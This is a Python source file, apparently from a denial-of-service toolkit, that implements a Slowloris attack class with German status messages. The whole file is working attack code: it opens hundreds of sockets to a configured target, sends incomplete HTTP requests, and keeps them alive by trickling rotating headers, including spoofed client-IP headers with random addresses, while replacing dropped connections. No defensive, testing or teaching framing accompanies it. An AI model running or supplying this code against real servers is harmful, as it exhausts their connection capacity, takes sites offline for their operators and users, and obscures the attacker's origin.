import asyncio
import random
import string
import socket
from src.attacks.base import AttackBase

class Slowloris(AttackBase):
    async def setup(self):
        await super().setup()
        self.sockets = []
        self.headers_in_rotation = [
            "X-Requested-With: XMLHttpRequest",
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Language: de-DE,de;q=0.9,en;q=0.8",
            "Accept-Language: fr-FR,fr;q=0.9,en;q=0.8",
            "Accept-Language: es-ES,es;q=0.9,en;q=0.8",
            "Accept-Language: zh-CN,zh;q=0.9,en;q=0.8",
            "Accept-Encoding: gzip, deflate, br",
            "Connection: keep-alive",
            "Keep-Alive: {timeout}",
            "X-Forwarded-For: {ip}",
            "X-Client-IP: {ip}",
            "X-Remote-IP: {ip}",
            "X-Originating-IP: {ip}",
            "User-Agent: {agent}",
            "Referer: {referrer}",
            "Content-Type: application/x-www-form-urlencoded",
            "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{boundary}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests: 1",
            "Cache-Control: max-age=0",
            "Pragma: no-cache",
            "DNT: 1"
        ]
        print("Initialisiere Verbindungen für Slowloris...")
        connection_tasks = []
        for _ in range(min(500, self.config.threads * 50)):
            task = asyncio.create_task(self._create_socket())
            connection_tasks.append(task)
        if connection_tasks:
            await asyncio.wait(connection_tasks, timeout=10)
        self.sockets = [sock for sock in self.sockets if sock is not None]
        print(f"Slowloris initialisiert mit {len(self.sockets)} Verbindungen")
    
    async def cleanup(self):
        for sock in self.sockets:
            try:
                sock.close()
            except Exception:
                pass
        self.sockets = []
        await super().cleanup()
    
    async def _create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            if hasattr(socket, 'SO_REUSEPORT'):
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            sock.setblocking(False)
            loop = asyncio.get_event_loop()
            await asyncio.wait_for(loop.sock_connect(sock, (self.config.target, self.config.port)), timeout=self.config.timeout)
            user_agent = random.choice(self.config.user_agents)
            await loop.sock_sendall(sock, b"GET / HTTP/1.1\r\n")
            await loop.sock_sendall(sock, f"Host: {self.config.target}\r\n".encode())
            await loop.sock_sendall(sock, f"User-Agent: {user_agent}\r\n".encode())
            self.sockets.append(sock)
            self.stats.update_connections(True)
            return sock
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
            self.stats.update_connections(False)
            return None
    
    async def attack_loop(self):
        print("Starte Slowloris Angriff mit Header-Rotation...")
        loop = asyncio.get_event_loop()
        while not self.stop_event.is_set() and self.sockets:
            if self.stats.get_success_rate() > 70:
                wait_time = random.uniform(12, 18)
            elif self.stats.get_success_rate() < 30:
                wait_time = random.uniform(5, 8)
            else:
                wait_time = random.uniform(8, 12)
            await asyncio.sleep(wait_time)
            active_sockets = []
            for sock in self.sockets:
                try:
                    header = random.choice(self.headers_in_rotation)
                    if "{ip}" in header:
                        header = header.replace("{ip}", self._get_random_ip())
                    if "{agent}" in header:
                        header = header.replace("{agent}", random.choice(self.config.user_agents))
                    if "{referrer}" in header:
                        header = header.replace("{referrer}", random.choice(self.config.referrers))
                    if "{timeout}" in header:
                        header = header.replace("{timeout}", str(random.randint(300, 1200)))
                    if "{boundary}" in header:
                        boundary = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                        header = header.replace("{boundary}", boundary)
                    await loop.sock_sendall(sock, f"{header}\r\n".encode())
                    active_sockets.append(sock)
                    self.stats.update_sent(1, len(header) + 2)
                except Exception:
                    try:
                        sock.close()
                    except Exception:
                        pass
            self.sockets = active_sockets
            if len(self.sockets) < 100:
                await self._replace_dead_sockets()
    
    async def _replace_dead_sockets(self):
        replacements_needed = min(500 - len(self.sockets), 50)
        if replacements_needed > 0:
            print(f"Ersetze {replacements_needed} tote Verbindungen.")
            tasks = [asyncio.create_task(self._create_socket()) for _ in range(replacements_needed)]
            if tasks:
                await asyncio.wait(tasks, timeout=5)
